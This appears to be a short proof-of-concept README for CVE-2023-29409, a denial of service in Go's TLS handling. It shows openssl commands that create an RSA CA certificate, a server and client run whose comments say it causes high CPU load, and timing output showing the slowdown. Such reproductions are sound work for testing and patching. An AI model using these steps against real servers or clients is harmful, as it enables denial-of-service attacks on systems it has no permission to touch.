# CVE-2023-29409

```bash
$ openssl genrsa -out ca-key.pem 2048
$ openssl req -x509 -new -nodes -key ca-key.pem -sha256 -days 100000 -out ca.pem \
-addext 'keyUsage=keyCertSign' \
-subj '/CN=Root CA'
$ go run main.go server # (in the background)
$ go run main.go client # causes high cpu load on client
$ go run main.go client-auth # causes high cpu load on the server
```

```bash
$ time go run main.go client
tls: invalid signature by the server certificate: crypto/rsa: verification error

real    0m13,160s
user    0m13,328s
sys     0m0,101s

$ time go run main.go client-auth
<nil>

real    0m10,985s
user    0m0,255s
sys     0m0,044s
```
